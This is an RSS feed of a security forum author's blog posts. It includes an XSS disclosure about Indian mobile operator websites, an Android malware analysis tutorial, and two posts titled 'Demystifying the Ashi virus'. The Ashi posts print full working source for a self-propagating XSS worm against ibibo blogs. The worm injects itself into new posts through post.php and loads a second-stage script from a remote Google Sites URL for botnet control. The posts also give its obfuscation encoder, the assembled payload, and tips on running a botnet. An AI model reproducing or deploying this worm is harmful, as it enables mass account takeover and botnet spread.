<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - prashant_uniyal</title>
		<link>http://garage4hackers.com/blog.php?u=18</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:44:43 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - prashant_uniyal</title>
			<link>http://garage4hackers.com/blog.php?u=18</link>
		</image>
		<item>
			<title>XSS threats on leading Indian mobile operators websites</title>
			<link>http://garage4hackers.com/entry.php?b=516</link>
			<pubDate>Mon, 22 Oct 2012 15:08:28 GMT</pubDate>
			<description>While passing by common websites, we had came across various security issues in them in the past. Be it a bug on Facebook, Flipkart or Indian...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">While passing by common websites, we had came across various security issues in them in the past. Be it a bug on Facebook, Flipkart or Indian Shopping sites, we have brought up many issues in the past and have responsibly disclosed them. This time while passing by few mobile operators website, we noticed Cross-site scripting a.k.a XSS, 2nd top on the OWASP top 10 list. These vulnerabilities can be noticed very easily and can be used by cyber crooks to execute malicious scripts on the website, and carry out stealth operations like phishing, scams etc.<br />
<br />
The leading mobile operators whose websites we had uncovered are : Idea Cellular, Tata Communications and BSNL, India’s government backed telecom company. The two websites had persistent XSS and the third one a non-persistent. The following are some screen-shot of the websites where you can see scripts injected and iframe:<br />
<br />
<img src="http://blog.secfence.com/wp-content/uploads/2012/10/idea1.png" border="0" alt="" /><br />
<br />
<img src="http://blog.secfence.com/wp-content/uploads/2012/10/bsnl.png" border="0" alt="" /><br />
<br />
<img src="http://blog.secfence.com/wp-content/uploads/2012/10/tata.png" border="0" alt="" /><br />
<br />
Well the response, as usual from the concerned authorities was dull or you can say nil! Still we waited for a long time frame and today are disclosing these threats. We hope these get patched as soon as possible. Users are advised to be aware while using such websites and should check for the legitimate emails from these websites, should check links closely before responding. One of the protection method is using Firefox with No-script add-on.</blockquote>

]]></content:encoded>
			<dc:creator>prashant_uniyal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=516</guid>
		</item>
		<item>
			<title>Performing Android malware analysis</title>
			<link>http://garage4hackers.com/entry.php?b=334</link>
			<pubDate>Tue, 22 May 2012 09:21:26 GMT</pubDate>
			<description>In the past few years, malware and Trojans have moved with a rapid pace when it comes to mobile portability. Many famous Trojans and malwares have...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">In the past few years, malware and Trojans have moved with a rapid pace when it comes to mobile portability. Many famous Trojans and malwares have been detected and analyzed in the past. Android being the latest and a popular mobile platform has become all time famous target of cyber crooks and malware authors. Android application package file or APK is the file format used to distribute and install application software and middle-ware into Android operating system.To make an APK file, a program for Android is first compiled, and then all of its parts are packaged into one file. This holds all of that program’s code such as (.dex files), resources, assets, certificates, and manifest file.These files have .apk extension, but they are just ZIP files. They can be extracted using win-rar or win-zip.<br />
<br />
Today we will look into analysis of malicious Android application. As usual in a malware analysis, the analysis is basically of two types: Static Analysis and Dynamic Analysis. Many free tools are available over the internet for malware analysis. Let me tell you a few that would help you in the analysis of malicious Android application<br />
<br />
<b>Static Analysis</b>:<br />
<i><u>Mobile Sandbox</u></i>: It provides static analysis of malware images with an easy accessible web interface for submission.<br />
<br />
<i><u>IDA pro</u></i>: It is a well known and most common among reverse engineers disassembler and debugger. It is supporting Android bytecode from the professional versions 6.1 and above.<br />
<br />
<i><u>APKInspector</u></i>: APKinspector is a powerful GUI tool for analysts to analyze the Android applications.<br />
<br />
<i><u>Dex2jar</u></i>: It is a tool for converting Android’s .dex format to Java’s .class format<br />
<br />
<i><u>JD-GUI</u></i>: JD-GUI is a standalone graphical utility that displays Java source codes of .class files. You can browse the reconstructed source code with the JD-GUI for instant access to methods and fields.<br />
<br />
<i><u>Androguard</u></i>: An Android reverse engineering toolkit<br />
<br />
<i><u>Dexdump</u></i>: It is a Java .dex file format decompiler<br />
<br />
<b>Dynamic Analysis:</b><br />
<i><u>Droidbox:</u></i> An Android Application Sandbox for Dynamic Analysis,the sandbox will utilize static pre-check, dynamic taint analysis and API monitoring. Data leaks can be detected by tainting sensitive data and placing taint sinks throughout the API. Additionally, by logging relevant API function parameters and return values, a potential malware can be discovered and reported for further analysis.<br />
<br />
<i><u>The Android SDK</u></i>: A software development kit that enables developers to create applications for the Android platform. The Android SDK includes sample projects with source code, development tools, an emulator, and required libraries to build Android applications. Applications are written using the Java programming language and run on Dalvik, a custom virtual machine designed for embedded use which runs on top of a Linux kernel.Using the Android SDK we can create a virtual android device almost identical in functionality and capabilities of an android telephone and using that virtual device as secure environment we can execute the malware and observe the behavior of it.<br />
<br />
Let us quickly perform a static analysis of an Android malware. Contagion has always been the top choice when it comes to grab some malware sample. <a href="http://contagiominidump.blogspot.in/" target="_blank">Contagion Mini</a> is the new place where you can get mobile malware samples. We have <b>iMatch</b>, a malicious Android application. A malicious Android application, we will try to look into the internals of the file and try to detect the malicious code. The very first step would be to extract the iMatch.apk file. It can be done easily using win-rar or win-zip.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=373&amp;d=1337678185" border="0" alt="Name:  p1.jpg
Views: 529
Size:  9.4 KB"  style="float: CONFIG" /><img src="http://garage4hackers.com/attachment.php?attachmentid=374&amp;d=1337678187" border="0" alt="Name:  p2.jpg
Views: 540
Size:  7.2 KB"  style="float: CONFIG" /><br />
<br />
Now to get a better overview of the source code, we will convert .dex file into .jar file. We will use dex2jar tool kit that will perform the function.<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=375&amp;d=1337678193" border="0" alt="Name:  p3.jpg
Views: 586
Size:  58.6 KB"  style="float: CONFIG" /><img src="http://garage4hackers.com/attachment.php?attachmentid=376&amp;d=1337678197" border="0" alt="Name:  p5.jpg
Views: 567
Size:  44.9 KB"  style="float: CONFIG" /><br />
<br />
JD-GUI will help us view the readable format of the class file.<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=379&amp;d=1337678226" border="0" alt="Name:  p9.jpg
Views: 576
Size:  90.1 KB"  style="float: CONFIG" /><br />
<br />
Thereafter, we can perform thorough analysis of the file and check for the malicious codes and the unwanted things.<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=378&amp;d=1337678214" border="0" alt="Name:  p8.jpg
Views: 546
Size:  86.2 KB"  style="float: CONFIG" /><img src="http://garage4hackers.com/attachment.php?attachmentid=377&amp;d=1337678204" border="0" alt="Name:  p7.jpg
Views: 553
Size:  89.1 KB"  style="float: CONFIG" /><br />
<br />
While going through the classes IMatch and MJReciver, we noticed few unwanted numbers. On reading the code, we analyzed a function was made to send SMS to some numbers. Usually, Android applications access contacts, network extra as a part of application features<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=380&amp;d=1337678239" border="0" alt="Name:  p10.jpg
Views: 639
Size:  92.0 KB"  style="float: CONFIG" /><br />
<br />
Doing a quick search on Google resulted that those number where premium rate SMS numbers. This means that this malicious application sends premium SMS from the users mobile, thus making cyber crooks cheat people and earn money. The chain is simple:<i> Malicious application downloaded —&gt; Installed on the phone —&gt; Once application runs, it sends premium rate SMS.</i> So this was a quick malware analysis that can be practiced to perform and analyze malicious Android application.</blockquote>

]]></content:encoded>
			<dc:creator>prashant_uniyal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=334</guid>
		</item>
		<item>
			<title><![CDATA[Demystifying The Ashi virus--"vinnu" PART III]]></title>
			<link>http://garage4hackers.com/entry.php?b=28</link>
			<pubDate>Mon, 23 Aug 2010 09:56:49 GMT</pubDate>
			<description>Now I just need to scramble the code. For this purpose I created a HTML file containing the code and encoder and decoder. This file will assemble the...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Now I just need to scramble the code. For this purpose I created a HTML file containing the code and encoder and decoder. This file will assemble the virus and will provide us the viral code. The HTML code is:<br />
&lt;html&gt;<br />
&lt;head&gt;&lt;title&gt;Ashi assmebler by &quot;vinnu&quot;&lt;/title&gt;<br />
&lt;script language=javascript&gt;<br />
var ashi='trigger();function trigger(){var<br />
vin=document.getElementsByTagName(\&quot;a\&quot;);var total=0;var index=0;var<br />
address;for(var iter=0;iter&lt;vin.length;iter++)<br />
{if((index=vin[iter].href.indexOf(\&quot;wp-admin\&quot;))!=-1)<br />
{address=vin[iter].href.substring(0,index+8)+\&quot;/post.php\&quot;;blog(address);}}}functi<br />
on blog(addr){var encodr=\&quot;function y(x){var s=\\&quot;\\&quot;,r=\\&quot;\\&quot;;for(var<br />
i=0;i&lt;x.length;i++){s=x.charAt(i);if(s==\\&quot;\\x51\\  &quot;){s=\\&quot;\\x25\\&quot;;}else<br />
if(s==\\&quot;\\x5A\\&quot;){s=\\&quot;\\x69\\&quot;;}else if(s==\\&quot;\\x4A\\&quot;){s=\\&quot;\\x61\\&quot;;}else<br />
if(s==\\&quot;\\x46\\&quot;){s=\\&quot;\\x74\\&quot;;}else{s=x.charAt(  i);}r+=s;}r=unescape(r);return<br />
r;}\&quot;;var nunnu=\&quot;&gt;&lt;scr\&quot;+\&quot;ipt language=javascript\&quot;+\&quot;<br />
src=\\&quot;http://sites.google.com/site/cyberspecies/n/ibibo.js\\&quot;&gt;&lt;/scr\&quot;+\&quot;ipt&gt;&lt;a<br />
href=\\&quot;\\&quot; onmouseover=javascript<b></b>:eval(y(ashi));&gt;jaijeya&lt;/a&gt;&lt;a \&quot;;var<br />
no=Math.floor(Math.random()*10);var quote=new Array(10);quote[0]=\&quot;Sahdi bhasa<br />
sahdi jaan...\&quot;;quote[1]=\&quot;Dont you think we can...\&quot;;quote[2]=\&quot;Thats the<br />
attitude...Keep it up.\&quot;;quote[3]=\&quot;Intelligent?..\&quot;;quote[4]=\&quot;Main koi machine<br />
thodi hai...\&quot;;quote[5]=\&quot;jaijeya ji! Theek hainn na?...\&quot;;quote[6]=\&quot;Veero!<br />
Tusaan Eh bhi parhi leya\&quot;;quote[7]=\&quot;Himachal a heaven...\&quot;;quote[8]=\&quot;Free<br />
Tibet...\&quot;;quote[9]=\&quot;Paharhi!lovely language...\&quot;;var<br />
blpayload=\&quot;post_title=\&quot;+quote[no];blpayload+=\&quot;&amp;content=jaijeya&gt;&lt;/p&gt;&lt;/div\&quot;;blpa<br />
yload+=encodeURIComponent(\&quot;&gt;&lt;\&quot;+\&quot;sc\&quot;+\&quot;ript language=javascript&gt;var<br />
ashi=\'\&quot;+ashi+\&quot;\';eval(y(ashi));\&quot;+encodr+\&quot;&lt;\&quot;+  \&quot;/sc\&quot;+\&quot;ript&gt;&lt;a \&quot;);blpayload+<br />
=encodeURIComponent(nunnu);blpayload+=\&quot;hor&amp;tags_i  nput=&amp;action=post-quickpresssave&amp;<br />
quickpress_post_ID=0&amp;_wpnonce=&amp;_wp_http_referer=&amp;s  ave=Save<br />
%20Draft&amp;=Cancel&amp;publish=Publish\&quot;;ajaxPSLV(addr,b  lpayload);}function<br />
ajaxPSLV(url,payload){var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new<br />
XMLHttpRequest();}else if(window.ActiveXObject){try{xmlhttp=new<br />
ActiveXObject(\&quot;Microsoft.XMLHTTP\&quot;);}catch(e){try  {xmlhttp=new<br />
ActiveXObject(\&quot;Msxml2.XMLHTTP\&quot;);}catch(e){return  ;}}}xmlhttp.open(\&quot;POST\&quot;, url,<br />
true);xmlhttp.setRequestHeader(\&quot;Content-Type\&quot;,\&quot;application/x-www-formurlencoded\&quot;);<br />
xmlhttp.setRequestHeader(\&quot;Contentlength\&quot;,<br />
payload.length);xmlhttp.send(payload);}';<br />
ashi = z(ashi);<br />
var fuse = ';function y(x){var s=\&quot;\&quot;,r=\&quot;\&quot;;for(var i=0;i&lt;x.length;i+<br />
+){s=x.charAt(i);if(s==\&quot;Q\&quot;){s=\&quot;%\&quot;;}else if(s==\&quot;Z\&quot;){s=\&quot;i\&quot;;}else<br />
if(s==\&quot;J\&quot;){s=\&quot;a\&quot;;}else if(s==\&quot;F\&quot;)<br />
{s=\&quot;t\&quot;;}else{s=x.charAt(i);}r+=s;}r=unescape(r);  return<br />
r; };eval(y(ashi));alert(\&quot;Decoded and executed: \&quot;+y(ashi));';<br />
var assembledAshi = &quot;javascript<b></b>:var ashi='&quot;+z(ashi)+&quot;'&quot;+fuse;<br />
var vhtml = &quot;&lt;P&gt;&lt;PRE&gt;&quot; + assembledAshi+&quot;&lt;/PRE&gt;&lt;/P&gt;&quot;;<br />
function z(x) {x=escape(x);var s=&quot;&quot;,r=&quot;&quot;;for(var i=0;i&lt;x.length;i+<br />
+){ s=x.charAt(i); if(s==&quot;%&quot;){s=&quot;Q&quot;;}else if(s==&quot;i&quot;){s=&quot;Z&quot;}else if(s==&quot;a&quot;)<br />
{s=&quot;J&quot;;}else if(s==&quot;t&quot;){s=&quot;F&quot;;}else{s=x.charAt(i);}r+=s;}return r; }<br />
function y(x) {var s=&quot;&quot;,r=&quot;&quot;;for(var i=0;i&lt;x.length;i++)<br />
{ s=x.charAt(i); if(s==&quot;Q&quot;){s=&quot;%&quot;;}else if(s==&quot;Z&quot;){s=&quot;i&quot;;}else if(s==&quot;J&quot;)<br />
{s=&quot;a&quot;;}else if(s==&quot;F&quot;){s=&quot;t&quot;;}else{s=x.charAt(i);}r+=s;}r=unes  cape(r);return<br />
r; }<br />
&lt;/script&gt;<br />
&lt;/head&gt;<br />
&lt;body&gt;<br />
&lt;H1&gt;The Ashi virus Assembler.&lt;/H1&gt;<br />
&lt;HR&gt;<br />
&lt;br&gt;<br />
&lt;div id=&quot;viraldiv&quot;&gt;&lt;H3&gt; love you nunnu&lt;/H3&gt;<br />
The viral Code:&lt;BR&gt;&lt;HR&gt;<br />
&lt;script language=javascript&gt;document.write(vhtml);&lt;/script&gt;<br />
&lt;HR&gt;<br />
&lt;div&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
<br />
And the final assembled code is:<br />
javascript<b></b>:var<br />
ashi='FrZggerQ28Q29Q3BfuncFZonQ20FrZggerQ28Q29Q7Bv  JrQ20vZnQ3DdocumenF.geFElemenFsB<br />
yTJgNJmeQ28Q22JQ22Q29Q3BvJrQ20FoFJlQ3D0Q3BvJrQ20Zn  dexQ3D0Q3BvJrQ20JddressQ3BforQ28<br />
vJrQ20ZFerQ3D0Q3BZFerQ3CvZn.lengFhQ3BZFer+<br />
+Q29Q7BZfQ28Q28ZndexQ3DvZnQ5BZFerQ5D.href.ZndexOfQ  28Q22wp-JdmZnQ22Q29Q29Q21Q3D-<br />
1Q29Q7BJddressQ3DvZnQ5BZFerQ5D.href.subsFrZngQ280Q  2CZndex+8Q29+Q22/posF.phpQ22Q3Bb<br />
logQ28JddressQ29Q3BQ7DQ7DQ7DfuncFZonQ20blogQ28Jddr  Q29Q7BvJrQ20encodrQ3DQ22funcFZon<br />
Q20yQ28xQ29Q7BvJrQ20sQ3DQ5CQ22Q5CQ22Q2CrQ3DQ5CQ22Q  5CQ22Q3BforQ28vJrQ20ZQ3D0Q3BZQ3C<br />
x.lengFhQ3BZ+<br />
+Q29Q7BsQ3Dx.chJrAFQ28ZQ29Q3BZfQ28sQ3DQ3DQ5CQ22Q5C  x51Q5CQ22Q29Q7BsQ3DQ5CQ22Q5Cx25Q<br />
5CQ22Q3BQ7DelseQ20ZfQ28sQ3DQ3DQ5CQ22Q5Cx5AQ5CQ22Q2  9Q7BsQ3DQ5CQ22Q5Cx69Q5CQ22Q3BQ7D<br />
elseQ20ZfQ28sQ3DQ3DQ5CQ22Q5Cx4AQ5CQ22Q29Q7BsQ3DQ5C  Q22Q5Cx61Q5CQ22Q3BQ7DelseQ20ZfQ2<br />
8sQ3DQ3DQ5CQ22Q5Cx46Q5CQ22Q29Q7BsQ3DQ5CQ22Q5Cx74Q5  CQ22Q3BQ7DelseQ7BsQ3Dx.chJrAFQ28<br />
ZQ29Q3BQ7Dr+Q3DsQ3BQ7DrQ3DunescJpeQ28rQ29Q3BreFurn  Q20rQ3BQ7DQ22Q3BvJrQ20nunnuQ3DQ2<br />
2Q3EQ3CscrQ22+Q22ZpFQ20lJnguJgeQ3DjJvJscrZpFQ22+Q2  2Q20srcQ3DQ5CQ22hFFpQ3A//sZFes.g<br />
oogle.com/sZFe/cyberspecZes/n/ZbZbo.jsQ5CQ22Q3EQ3C/scrQ22+Q22ZpFQ3EQ3CJQ20hrefQ3DQ<br />
5CQ22Q5CQ22Q20onmouseoverQ3DjJvJscrZpFQ3AevJlQ28yQ  28JshZQ29Q29Q3BQ3EjJZjeyJQ3C/JQ3<br />
EQ3CJQ20Q22Q3BvJrQ20noQ3DMJFh.floorQ28MJFh.rJndomQ  28Q29*10Q29Q3BvJrQ20quoFeQ3DnewQ<br />
20ArrJyQ2810Q29Q3BquoFeQ5B0Q5DQ3DQ22SJhdZQ20bhJsJQ  20sJhdZQ20jJJn...Q22Q3BquoFeQ5B1<br />
Q5DQ3DQ22DonFQ20youQ20FhZnkQ20weQ20cJn...Q22Q3Bquo  FeQ5B2Q5DQ3DQ22ThJFsQ20FheQ20JFF<br />
ZFude...KeepQ20ZFQ20up.Q22Q3BquoFeQ5B3Q5DQ3DQ22InF  ellZgenFQ3F..Q22Q3BquoFeQ5B4Q5DQ<br />
3DQ22MJZnQ20koZQ20mJchZneQ20FhodZQ20hJZ...Q22Q3Bqu  oFeQ5B5Q5DQ3DQ22jJZjeyJQ20jZQ21Q<br />
20TheekQ20hJZnnQ20nJQ3F...Q22Q3BquoFeQ5B6Q5DQ3DQ22  VeeroQ21Q20TusJJnQ20EhQ20bhZQ20p<br />
JrhZQ20leyJQ22Q3BquoFeQ5B7Q5DQ3DQ22HZmJchJlQ20JQ20  heJven...Q22Q3BquoFeQ5B8Q5DQ3DQ2<br />
2FreeQ20TZbeF...Q22Q3BquoFeQ5B9Q5DQ3DQ22PJhJrhZQ21  lovelyQ20lJnguJge...Q22Q3BvJrQ20<br />
blpJyloJdQ3DQ22posF_FZFleQ3DQ22+quoFeQ5BnoQ5DQ3Bbl  pJyloJd+Q3DQ22Q26conFenFQ3DjJZje<br />
yJQ3EQ3C/pQ3EQ3C/dZvQ22Q3BblpJyloJd+Q3DencodeURIComponenFQ28Q22Q3EQ  3CQ22+Q22scQ22+<br />
Q22rZpFQ20lJnguJgeQ3DjJvJscrZpFQ3EvJrQ20JshZQ3DQ27  Q22+JshZ+Q22Q27Q3BevJlQ28yQ28Jsh<br />
ZQ29Q29Q3BQ22+encodr+Q22Q3CQ22+Q22/scQ22+Q22rZpFQ3EQ3CJQ20Q22Q29Q3BblpJyloJd+Q3Den<br />
codeURIComponenFQ28nunnuQ29Q3BblpJyloJd+Q3DQ22horQ  26FJgs_ZnpuFQ3DQ26JcFZonQ3DposFquZckpresssJveQ26qu  Zckpress_<br />
posF_IDQ3D0Q26_wpnonceQ3DQ26_wp_hFFp_refererQ3DQ26  sJveQ3DSJveQ25<br />
20DrJfFQ26Q3DCJncelQ26publZshQ3DPublZshQ22Q3BJjJxP  SLVQ28JddrQ2CblpJyloJdQ29Q3BQ7Df<br />
uncFZonQ20JjJxPSLVQ28urlQ2CpJyloJdQ29Q7BvJrQ20xmlh  FFpQ3BZfQ28wZndow.XMLHFFpRequesF<br />
Q29Q7BxmlhFFpQ3DnewQ20XMLHFFpRequesFQ28Q29Q3BQ7Del  seQ20ZfQ28wZndow.AcFZveXObjecFQ2<br />
9Q7BFryQ7BxmlhFFpQ3DnewQ20AcFZveXObjecFQ28Q22MZcro  sofF.XMLHTTPQ22Q29Q3BQ7DcJFchQ28<br />
eQ29Q7BFryQ7BxmlhFFpQ3DnewQ20AcFZveXObjecFQ28Q22Ms  xml2.XMLHTTPQ22Q29Q3BQ7DcJFchQ28<br />
eQ29Q7BreFurnQ3BQ7DQ7DQ7DxmlhFFp.openQ28Q22POSTQ22  Q2CQ20urlQ2CQ20FrueQ29Q3BxmlhFFp<br />
.seFRequesFHeJderQ28Q22ConFenF-TypeQ22Q2CQ22JpplZcJFZon/x-www-formurlencodedQ22Q29Q3BxmlhFFp.<br />
seFRequesFHeJderQ28Q22ConFenFlengFhQ22Q2CpJyloJd.<br />
lengFhQ29Q3BxmlhFFp.sendQ28pJyloJdQ29Q3BQ7D';funct  ion y(x){var<br />
s=&quot;&quot;,r=&quot;&quot;;for(var i=0;i&lt;x.length;i++){s=x.charAt(i);if(s==&quot;Q&quot;){s=&quot;%&quot;  ;}else<br />
if(s==&quot;Z&quot;){s=&quot;i&quot;;}else if(s==&quot;J&quot;){s=&quot;a&quot;;}else if(s==&quot;F&quot;)<br />
{s=&quot;t&quot;;}else{s=x.charAt(i);}r+=s;}r=unescape(r);re  turn<br />
r; };eval(y(ashi));alert(&quot;Decoded and executed: &quot;+y(ashi));<br />
<br />
The last alert has been added to the above viral code to make sure that the virus is properly triggered. It is not a part of virus and will not be replicated. And thats it. The &quot;Ashi&quot; virus...&quot;vinnu&quot; I have informed ibibo about this virus.<br />
This virus is a very good example of artificial living organizms helping each other for their living. For example, they have stopped the new blog posts to be submitted now, but They haven't yet removed the infection and virus is still on blogs. And this virus having a stage two also available for retrieval of the code. So either it can be upgraded to exploit other vulnerabilities or can also be used to download another virus to already infected blogs and keep the infection one step ahead of the developers reach....&quot;vinnu&quot;<br />
Thanx a lot...&quot;vinnu&quot;<br />
------------------------------------------------------------------------------------------------------------------------------------<br />
<img src="http://www.loxian.byethost7.com/ashi/a1.jpg" border="0" alt="" /><br />
<br />
<img src="http://www.loxian.byethost7.com/ashi/a2.jpg" border="0" alt="" /><br />
<br />
<img src="http://www.loxian.byethost7.com/ashi/a3.jpg" border="0" alt="" /><br />
<br />
<img src="http://www.loxian.byethost7.com/ashi/a7.jpg" border="0" alt="" /><br />
<br />
<img src="http://www.loxian.byethost7.com/ashi/a4.jpg" border="0" alt="" /><br />
<br />
<img src="http://www.loxian.byethost7.com/ashi/a6.jpg" border="0" alt="" /></blockquote>

]]></content:encoded>
			<dc:creator>prashant_uniyal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=28</guid>
		</item>
		<item>
			<title><![CDATA[Demystifying The Ashi virus--"vinnu" PART II]]></title>
			<link>http://garage4hackers.com/entry.php?b=27</link>
			<pubDate>Mon, 23 Aug 2010 08:19:16 GMT</pubDate>
			<description><![CDATA[This is a google's free page uploading facility (http://sites.google.com/site). I loaded the .js file as an attatchment. But it contained nothing...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">This is a google's free page uploading facility (<a href="http://sites.google.com/site" target="_blank">http://sites.google.com/site</a>). I loaded the .js file as an attatchment. But it contained nothing initially.It was meant for controlling the Botnet and commanding it later in forming the XSS tunnels. It was the second stage of two staged botnet formation.Note: The third party free sites are also useful to connect to a botnet if you do not have any dedicated server. In ur script file at free site like google,you can place a script that can redirect the requests to ur home computer. This can be achieved by using a simplest &lt;script&gt; tag with its &quot;src&quot; attribute defined to ur home computer's current IP address. But this makes it necessary to remove such redirector scripts or change the IP address everytime you get a new IP address or disconnect. Otherwise,the botnet will be orphaned or will end up in chaos.<br />
<br />
Now, we have formed a script. But still; it cannot go beyond the currently infected blogs.We need to direct our script to inject itself (whole script) into other blogs also. This can be achieved by a enclosing whole script into a<br />
string variable and then using the eval() method.The eval () method takes a string type argument that holds the code for execution and executes the code.For example, if we have some code in a variable vinnu and we want to<br />
execute it, then we can do it like:<br />
var vinnu = &quot;alert(document.cookie);&quot;;eval(vinnu);<br />
<br />
So what we can do now is, we have to equate above all code into a variable and then feed this very variable to the &quot;content&quot; variable and eval the variable as in above script.I defined a variable named &quot;ashi&quot; and fed it to the &quot;content&quot; in blogs payload for posting it to the post.php. And finally called eval();<br />
Note: Check this scenario:<br />
eval(vinnu);alert(vinnu);var vinnu=&quot;alert(document.cookie)&quot;;<br />
This script will fail. It works normally with the lately defined function, but not with variables.The above script will work second time, but will fail for first time, So never use it: eval(vinnu);var vinnu=&quot;alert(document.cookie)&quot;;<br />
<br />
This is because When it gets executed for first time, eval cannot resolve variable as variables should be defined first and called later (Not the case with functions).But the in second attempt, it already has defined the variable &quot;vinnu&quot; after the failure of eval during first execution. Also the alert() method is added just for debugging purpose and it must be removed in final product.<br />
<br />
Therefor It should now look like something:<br />
var ashi='trigger();function trigger(){var vin=.....<br />
..................................................  ..<br />
..................................................  ..<br />
blpayload+=encodeURIComponent(\&quot;&gt;&lt;\&quot;+\&quot;sc\&quot;+\&quot;ript<br />
language=javascript&gt;var ashi=\'\&quot;+ashi+\&quot;\';eval(ashi);&lt;\&quot;+\&quot;/sc\&quot;+\&quot;ript&gt;&lt;a \&quot;);<br />
blpayload+=encodeURIComponent(nunnu);.............  ..<br />
..................................................  ..<br />
The important part here I want to discus is:<br />
\&quot;&gt;&lt;\&quot;+\&quot;sc\&quot;+\&quot;ript language=javascript&gt;var<br />
ashi=\'\&quot;+ashi+\&quot;\';eval(ashi);&lt;\&quot;+\&quot;/sc\&quot;+\&quot;ript&gt;&lt;a \&quot;<br />
Now i have turned whole script into a string variable.And thats why i have to escape all double and single quotation marks with a preffixed escape character ( \ ).Also i have to explicitely define variable &quot;ashi&quot; once again within<br />
the string also. This is necessary. We want the code to regain the shape of its parent code once again. And the parent code itself starts with<br />
&lt;script&gt;var ashi = '..........<br />
Also remember that do not specify &lt;script&gt; or &lt;/script&gt; anywhere even within the string or variable. This is because the browser's javascript engine will take &lt;/script&gt; tag as the end of the script code.<br />
So always break it into pieces as:<br />
&quot;&lt;/sc&quot;+&quot;rip&quot;+&quot;t&gt;&quot;<br />
Now after applying above concepts I got the following code:<br />
javascript<b></b>:var ashi='trigger();function trigger(){var<br />
vin=document.getElementsByTagName(\&quot;a\&quot;);var total=0;var index=0;var<br />
address;for(var iter=0;iter&lt;vin.length;iter++)<br />
{if((index=vin[iter].href.indexOf(\&quot;wp-admin\&quot;))!=-1)<br />
{address=vin[iter].href.substring(0,index+8)+\&quot;/post.php\&quot;;blog(address);}}}functi<br />
on blog(addr){var nunnu=\&quot;&gt;&lt;scr\&quot;+\&quot;ipt language=javascript\&quot;+\&quot;<br />
src=\\&quot;http://sites.google.com/site/urcontrolledsite/ibibo.js\\&quot;&gt;&lt;/scr\&quot;+\&quot;ipt&gt;&lt;a<br />
href=\\&quot;\\&quot; onmouseover=javascript<b></b>:blog();&gt;Jaijeya&lt;/a&gt;&lt;a \&quot;;var<br />
no=Math.floor(Math.random()*10);var quote=new Array(10);quote[0]=\&quot;Sahdi bhasa<br />
sahdi jaan...\&quot;;quote[1]=\&quot;Dont you think we can...\&quot;;quote[2]=\&quot;Thats the<br />
attitude...Keep it up.\&quot;;quote[3]=\&quot;Intelligent?..\&quot;;quote[4]=\&quot;Main koi machine<br />
thodi hai...\&quot;;quote[5]=\&quot;Jaijeya ji! Theek hainn na?...\&quot;;quote[6]=\&quot;Veero!<br />
Tusaan Eh bhi parhi leya\&quot;;quote[7]=\&quot;Himachal a heaven...\&quot;;quote[8]=\&quot;Free<br />
Tibet...\&quot;;quote[9]=\&quot;Paharhi!lovely language...\&quot;;var<br />
blpayload=\&quot;post_title=\&quot;+quote[no];blpayload+=\&quot;&amp;content=Jaijeya&gt;&lt;/p&gt;&lt;/div\&quot;;blpa<br />
yload+=encodeURIComponent(\&quot;&gt;&lt;\&quot;+\&quot;sc\&quot;+\&quot;ript language=javascript&gt;var<br />
ashi=\'\&quot;+ashi+\&quot;\';eval(ashi);&lt;\&quot;+\&quot;/sc\&quot;+\&quot;ript&gt;&lt;a \&quot;);blpayload+=encodeURICompo<br />
nent(nunnu);blpayload+=\&quot;hor&amp;tags_input=&amp;action=po  st-quickpresssave&amp;<br />
quickpress_post_ID=0&amp;_wpnonce=&amp;_wp_http_referer=&amp;s  ave=Save<br />
%20Draft&amp;=Cancel&amp;publish=Publish\&quot;;ajaxPSLV(addr,b  lpayload);}function<br />
ajaxPSLV(url,payload){var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new<br />
XMLHttpRequest();}else if(window.ActiveXObject){try{xmlhttp=new<br />
ActiveXObject(\&quot;Microsoft.XMLHTTP\&quot;);}catch(e){try  {xmlhttp=new<br />
ActiveXObject(\&quot;Msxml2.XMLHTTP\&quot;);}catch(e){return  ;}}}xmlhttp.open(\&quot;POST\&quot;, url,<br />
true);xmlhttp.setRequestHeader(\&quot;Content-Type\&quot;,\&quot;application/x-www-formurlencoded\&quot;);<br />
xmlhttp.setRequestHeader(\&quot;Contentlength\&quot;,<br />
payload.length);xmlhttp.send(payload);alert(payloa  d);}';eval(ashi);alert(<br />
&quot;done&quot;);<br />
<br />
The HTML tags which are appearing within the script are for the alignment of the Injection Vector of the XSS payload. The virus is ready. And u can trigger it now from your web-browser's addressbar while you are already logged in into the blogs.ibibo.com. But this virus is still in clear text. So why not apply some scrambling<br />
to it. There are some easiest and fast ways to do it (There are also robust encryption schemes like DES, SHA, RSA, base64,..etc. But i used the simplest to save the processing overhead). One simplest way to do it by using escape() and its decoder is unescape(). The escape() function converts special charecters into their hex form by prefixing<br />
the hex with a &quot;%&quot; sign. We can use escape multiple times.<br />
<br />
Remember more you'll escape it will increase the size of scramble everytime. Now I have a facility to convert all special charecters. But what about the character literals. I have to develop a special encoder and decoder for<br />
them. I don't want to scramble all of the characters, just jumbling some of them will<br />
be enough. As a choice for encryption technique, i used the several thousand years<br />
old technique ... the transformation technique and the script I developed is<br />
The encoder: function z(x) {<br />
